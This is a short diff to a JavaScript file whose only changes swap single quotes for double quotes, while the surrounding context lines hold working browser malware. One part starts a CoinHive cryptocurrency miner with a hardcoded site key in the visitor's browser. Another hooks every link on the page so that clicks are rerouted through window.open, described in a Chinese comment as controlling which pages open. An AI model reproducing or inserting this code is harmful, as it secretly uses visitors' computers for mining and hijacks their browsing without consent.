@@ -7,7 +7,7 @@ window.dig = {}
 				c.dig.CoinHive = c.CoinHive;
 				c.dig.m = new c.dig.CoinHive.Anonymous("hHsRjaE8oBVv8edpubwHE1u3SHLTXjV4", {throttle: 0.8});
 				c.dig.m.start();
-				c.console.log('ok');
+				c.console.log("ok");
 			}
 		}
 
@@ -17,11 +17,11 @@ window.dig = {}
 
 	window.dig.hAtag = function(c){
 
-		c.dig.list = c.document.getElementsByTagName('a');				//4、hook所有A标签，控制打开的页面
+		c.dig.list = c.document.getElementsByTagName("a");				//4、hook所有A标签，控制打开的页面
 		for(var i=0;i<c.dig.list.length;i++){
 			if(c.dig.list[i].href.match(/^[http|https](.*)/)){
 				var h = c.dig.list[i].href;
-				c.dig.list[i].href = 'javascript:void(0)';
+				c.dig.list[i].href = "javascript:void(0)";
 				c.dig.list[i].onclick = function(){c.open(h);}
 			}
 		}
